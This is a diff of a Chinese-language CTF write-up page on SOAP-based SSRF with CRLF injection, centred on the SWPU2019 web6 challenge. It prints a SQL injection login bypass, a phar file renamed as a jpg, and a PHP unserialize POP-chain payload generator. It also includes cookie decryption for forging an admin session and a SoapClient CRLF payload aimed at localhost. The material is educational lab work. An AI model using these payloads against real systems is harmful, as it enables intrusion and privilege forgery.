+$phar = new Phar(&quot;1.phar&quot;); //后缀名必须为phar
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;&lt;script language=&#39;php&#39;&gt; __HALT_COMPILER(); &lt;/script&gt;&quot;); //设置stub
+$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+$phar-&gt;stopBuffering();
+rename(&#39;1.phar&#39;,&#39;1.jpg&#39;);</code></pre>
 <p>同样提几个细节：</p>
 <ul>
 <li>Soap的参数中file_name被设为数组是反射类的一个特点，它接收的是数组参数。</li>
@@ -544,15 +615,164 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>用它的内网靶机就没事？好吧，还是有flag的hhh.<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/flag.PNG" class="lazyload" data-srcset="flag.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <h2 id="SWPU2019-web6"><a href="#SWPU2019-web6" class="headerlink" title="SWPU2019 web6"></a>SWPU2019 web6</h2><p>上来一个sql的万能密码，用到了<code>with rollup</code>的trick<br>1’ or ‘1’=’1’  group by passwd with rollup having passwd is NULL – -<br>添加一个空列，进行结果判断NULL=false<br>绕过弱类型相等</p>
 <p>进去后发现wsdl.php提供了不少接口，其中一个可以读文件<br>把可读的文件读一下<br>index.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">include</span> (<span class="string">"encode.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"Service.php"</span>);</span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//phpinfo();</span></span><br><span class="line"></span><br><span class="line">$method = $_GET[<span class="string">'method'</span>]?$_GET[<span class="string">'method'</span>]:<span class="string">'index'</span>;</span><br><span class="line"><span class="comment">//echo 1231;</span></span><br><span class="line">$allow_method = <span class="keyword">array</span>(<span class="string">"File_read"</span>,<span class="string">"login"</span>,<span class="string">"index"</span>,<span class="string">"hint"</span>,<span class="string">"user"</span>,<span class="string">"get_flag"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!in_array($method,$allow_method))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"not allow method"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($method===<span class="string">"File_read"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $param =$_POST[<span class="string">'filename'</span>];</span><br><span class="line">    $param2=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>($method===<span class="string">"login"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $param=$_POST[<span class="string">'username'</span>];</span><br><span class="line">        $param2 = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"method can use"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $method;</span><br><span class="line">$newclass = <span class="keyword">new</span> Service();</span><br><span class="line"><span class="keyword">echo</span> $newclass-&gt;$method($param,$param2);</span><br><span class="line"></span><br><span class="line">ob_flush();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">
+ &lt;?php
+ob_start();
+include (&quot;encode.php&quot;);
+include(&quot;Service.php&quot;);
+//error_reporting(0);
 
+//phpinfo();
+
+$method = $_GET[&#39;method&#39;]?$_GET[&#39;method&#39;]:&#39;index&#39;;
+//echo 1231;
+$allow_method = array(&quot;File_read&quot;,&quot;login&quot;,&quot;index&quot;,&quot;hint&quot;,&quot;user&quot;,&quot;get_flag&quot;);
+
+
+if(!in_array($method,$allow_method))
+{
+    die(&quot;not allow method&quot;);
+}
+
+
+if($method===&quot;File_read&quot;)
+{
+    $param =$_POST[&#39;filename&#39;];
+    $param2=null;
+
+}else
+{
+    if($method===&quot;login&quot;)
+    {
+        $param=$_POST[&#39;username&#39;];
+        $param2 = $_POST[&#39;passwd&#39;];
+    }else
+    {
+        echo &quot;method can use&quot;;
+    }
+}
+
+echo $method;
+$newclass = new Service();
+echo $newclass-&gt;$method($param,$param2);
+
+ob_flush();
+?&gt;</code></pre>
 <p>Surface.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'Service.php'</span>);</span><br><span class="line">    $ser = <span class="keyword">new</span> SoapServer(<span class="string">'Service.wsdl'</span>,<span class="keyword">array</span>(<span class="string">'soap_version'</span>=&gt;SOAP_1_2));</span><br><span class="line">    $ser-&gt;setClass(<span class="string">'Service'</span>);</span><br><span class="line">    $ser-&gt;handle();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="php">&lt;?php   
+    include(&#39;Service.php&#39;);
+    $ser = new SoapServer(&#39;Service.wsdl&#39;,array(&#39;soap_version&#39;=&gt;SOAP_1_2));
+    $ser-&gt;setClass(&#39;Service&#39;);
+    $ser-&gt;handle();
+?&gt;</code></pre>
 <p>se.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$param)</span>  调用函数，显然可跟进到<span class="title">invoke</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">                &#123;</span><br><span class="line">                    $s1 = <span class="keyword">$this</span>-&gt;&#123;$name&#125;;</span><br><span class="line">                    $s1();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($ke)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;mod2[$ke];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span>  入手点，显然可跟进到<span class="title">__call</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> $mod3;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod2 = <span class="keyword">$this</span>-&gt;mod3.<span class="keyword">$this</span>-&gt;mod1; 拼接,那么有字符串了</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">public</span> $flag;</span><br><span class="line">        <span class="keyword">public</span> $b;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span>  此处可<span class="title">ssrf</span>，到头了</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                session_start(); </span><br><span class="line">                var_dump($_SESSION);</span><br><span class="line">                $a = <span class="keyword">array</span>(reset($_SESSION),<span class="keyword">$this</span>-&gt;flag);</span><br><span class="line">                <span class="keyword">echo</span> call_user_func(<span class="keyword">$this</span>-&gt;b,$a);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> $str2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;str1-&gt;&#123;<span class="keyword">$this</span>-&gt;str2&#125;(); 有字符串了，只有他能调用对象的方法，当然是ssrf</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = $_POST[<span class="string">'aa'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+
+
+ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
+
+class aa
+{
+        public $mod1;
+        public $mod2;
+        public function __call($name,$param)  调用函数，显然可跟进到invoke
+        {
+            if($this-&gt;{$name})
+                {
+                    $s1 = $this-&gt;{$name};
+                    $s1();
+                }
+        }
+        public function __get($ke)
+        {
+            return $this-&gt;mod2[$ke];
+        }
+}
+
+
+class bb
+{
+        public $mod1;
+        public $mod2;
+        public function __destruct()  入手点，显然可跟进到__call
+        {
+            $this-&gt;mod1-&gt;test2();
+        }
+} 
+
+class cc
+{
+        public $mod1;
+        public $mod2;
+        public $mod3;
+        public function __invoke()
+        {
+                $this-&gt;mod2 = $this-&gt;mod3.$this-&gt;mod1; 拼接,那么有字符串了
+        } 
+}
+
+class dd
+{
+        public $name;
+        public $flag;
+        public $b;
+
+        public function getflag()  此处可ssrf，到头了
+        {
+                session_start(); 
+                var_dump($_SESSION);
+                $a = array(reset($_SESSION),$this-&gt;flag);
+                echo call_user_func($this-&gt;b,$a);
+        }
+}
+class ee
+{
+        public $str1;
+        public $str2;
+        public function __toString()
+        {
+                $this-&gt;str1-&gt;{$this-&gt;str2}(); 有字符串了，只有他能调用对象的方法，当然是ssrf
+                return &quot;1&quot;;
+        }
+}
+
+
+
+
+$a = $_POST[&#39;aa&#39;];
+unserialize($a);
+?&gt;
+
+</code></pre>
 <p>encode.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">en_crypt</span><span class="params">($content,$key)</span></span>&#123;</span><br><span class="line">    $key    =    md5($key);</span><br><span class="line">    $h      =    <span class="number">0</span>;</span><br><span class="line">    $length    =    strlen($content);</span><br><span class="line">    $swpuctf      =    strlen($key);</span><br><span class="line">    $varch   =    <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($h == $swpuctf)</span><br><span class="line">        &#123;</span><br><span class="line">            $h = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $varch .= $key&#123;$h&#125;;</span><br><span class="line">        </span><br><span class="line">        $h++;</span><br><span class="line">    &#125;</span><br><span class="line">    $swpu  =  <span class="string">''</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $swpu .= chr(ord($content&#123;$j&#125;) + (ord($varch&#123;$j&#125;)) % <span class="number">256</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($swpu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+
+
+function en_crypt($content,$key){
+    $key    =    md5($key);
+    $h      =    0;
+    $length    =    strlen($content);
+    $swpuctf      =    strlen($key);
+    $varch   =    &#39;&#39;;
+    for ($j = 0; $j &lt; $length; $j++)
+    {
+        if ($h == $swpuctf)
+        {
+            $h = 0;
+        }
+        $varch .= $key{$h};
+
+        $h++;
+    }
+    $swpu  =  &#39;&#39;;
+
+    for ($j = 0; $j &lt; $length; $j++)
+    {
+        $swpu .= chr(ord($content{$j}) + (ord($varch{$j})) % 256);
+    }
+    return base64_encode($swpu);
+}
+</code></pre>
 <p>找到不可读的方法 <code>get_flag</code>，得知要点：</p>
 <p>get_flag  only admin in 127.0.0.1 can get_flag</p>
 <ul>
@@ -561,16 +781,105 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <li>decrypt and be admin</li>
 </ul>
 <p>先看popchain</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bb-&gt;__destruct &#x2F;&#x2F;$mod1 为aa对象</span><br><span class="line">    -&gt;aa -&gt;_call()-&gt;$s1(); &#x2F;&#x2F;$需要调用的$s1是个对象</span><br><span class="line">        -&gt;cc-&gt; __invoke()-&gt; &#x2F;&#x2F;拼接，需要属性是字符串</span><br><span class="line">            ee-&gt;_toString()-&gt; &#x2F;&#x2F;$str1是dd对象-&gt;getflag()</span><br><span class="line">                dd-&gt;getflag()</span><br></pre></td></tr></table></figure>
+<pre><code>bb-&gt;__destruct //$mod1 为aa对象
+    -&gt;aa -&gt;_call()-&gt;$s1(); //$需要调用的$s1是个对象
+        -&gt;cc-&gt; __invoke()-&gt; //拼接，需要属性是字符串
+            ee-&gt;_toString()-&gt; //$str1是dd对象-&gt;getflag()
+                dd-&gt;getflag()</code></pre><pre><code class="php">&lt;?php
+class aa
+{
+        public $mod1;
+        public $mod2;
+}
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> $mod3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">public</span> $flag;</span><br><span class="line">        <span class="keyword">public</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> $str2;</span><br><span class="line">&#125;</span><br><span class="line">$ee=<span class="keyword">new</span> ee();</span><br><span class="line">$ee-&gt;str1=<span class="keyword">new</span> dd();</span><br><span class="line">$ee-&gt;str2=<span class="string">'getflag'</span>;</span><br><span class="line">$cc=<span class="keyword">new</span> cc();</span><br><span class="line">$cc-&gt;mod3=<span class="string">'1'</span>;</span><br><span class="line">$cc-&gt;mod1=$ee;</span><br><span class="line">$aa=<span class="keyword">new</span> aa();</span><br><span class="line">$aa-&gt;mod1=$cc;</span><br><span class="line">$aa-&gt;mod2=<span class="keyword">array</span>(<span class="string">'test2'</span>=&gt;&amp;$aa-&gt;mod1);</span><br><span class="line">$bb=<span class="keyword">new</span> bb();</span><br><span class="line">$bb-&gt;mod1=$aa;</span><br><span class="line"></span><br><span class="line">$ee-&gt;str1-&gt;b=<span class="string">'call_user_func'</span>;</span><br><span class="line">$ee-&gt;str1-&gt;flag=<span class="string">'get_flag'</span>;</span><br><span class="line">$sa=serialize($bb);</span><br><span class="line"><span class="keyword">echo</span> $sa;</span><br></pre></td></tr></table></figure>
+
+class bb
+{
+        public $mod1;
+        public $mod2;
+} 
+
+class cc
+{
+        public $mod1;
+        public $mod2;
+        public $mod3;
+}
+
+class dd
+{
+        public $name;
+        public $flag;
+        public $b;
+}
+class ee
+{
+        public $str1;
+        public $str2;
+}
+$ee=new ee();
+$ee-&gt;str1=new dd();
+$ee-&gt;str2=&#39;getflag&#39;;
+$cc=new cc();
+$cc-&gt;mod3=&#39;1&#39;;
+$cc-&gt;mod1=$ee;
+$aa=new aa();
+$aa-&gt;mod1=$cc;
+$aa-&gt;mod2=array(&#39;test2&#39;=&gt;&amp;$aa-&gt;mod1);
+$bb=new bb();
+$bb-&gt;mod1=$aa;
+
+$ee-&gt;str1-&gt;b=&#39;call_user_func&#39;;
+$ee-&gt;str1-&gt;flag=&#39;get_flag&#39;;
+$sa=serialize($bb);
+echo $sa;</code></pre>
 <p>这题类似bestphp’srevenge，所以前面的链好了后可以直接把getflag()用到的两个参数填好。原理是一样的。<br>链子好了,回头看看解码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">de_crypt</span><span class="params">($swpu,$key)</span></span>&#123;</span><br><span class="line">    $swpu=base64_decode($swpu);</span><br><span class="line">    $key=md5($key);</span><br><span class="line">    $h=<span class="number">0</span>;</span><br><span class="line">    $length=strlen($swpu);</span><br><span class="line">    $swpuctf=strlen($key);</span><br><span class="line">    $varch=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$length;$j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($h==$swpuctf)</span><br><span class="line">        &#123;</span><br><span class="line">            $h=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $varch.=$key&#123;$h&#125;;</span><br><span class="line">        $h++;</span><br><span class="line">    &#125;</span><br><span class="line">    $content=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$length;$j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $content.= chr(ord($swpu&#123;$j&#125;) - (ord($varch&#123;$j&#125;))+<span class="number">256</span> % <span class="number">256</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">function de_crypt($swpu,$key){
+    $swpu=base64_decode($swpu);
+    $key=md5($key);
+    $h=0;
+    $length=strlen($swpu);
+    $swpuctf=strlen($key);
+    $varch=&#39;&#39;;
+    for($j=0;$j&lt;$length;$j++){
+        if($h==$swpuctf)
+        {
+            $h=0;
+        }
+        $varch.=$key{$h};
+        $h++;
+    }
+    $content=&#39;&#39;;
+    for($j=0;$j&lt;$length;$j++)
+    {
+        $content.= chr(ord($swpu{$j}) - (ord($varch{$j}))+256 % 256);
+    }
+    return $content;
+}</code></pre>
 <p>解码cookie得到<code>xiaoC:3</code><br>那就加密伪造admin<br><code>admin:1 xZmdm9NxaQ==</code></p>
 <p>现在差一个Sopa打127.0.0.1调用getflag<br>需要注意的是<br>interface.php已经有现成的soap接口了，所以不能直接访问index.php调用get_flag。而是通过call_user_func调用SoapClient类的get_flag方法即调用了Service类的get_flag方法<br>先将数据写入session</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/interface.php'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: user=xZmdm9NxaQ=='</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target, <span class="string">'user_agent'</span>=&gt;<span class="string">'byc^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers),<span class="string">'uri'</span>=&gt;<span class="string">'aabb'</span>));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="string">'^^'</span>, <span class="string">"\r\n"</span>, $a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?
+$target = &#39;http://127.0.0.1/interface.php&#39;;
+$headers = array(
+    &#39;X-Forwarded-For: 127.0.0.1&#39;,
+    &#39;Cookie: user=xZmdm9NxaQ==&#39;,
+);
+
+$b = new SoapClient(null, array(&#39;location&#39; =&gt; $target, &#39;user_agent&#39;=&gt;&#39;byc^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers),&#39;uri&#39;=&gt;&#39;aabb&#39;));
+$a = serialize($b);
+$a = str_replace(&#39;^^&#39;, &quot;\r\n&quot;, $a);
+echo $a;
+?&gt;</code></pre>
 <p>利用表单传进session</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://04bda212-e690-478a-99d5-846e353f75ca.node3.buuoj.cn/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span 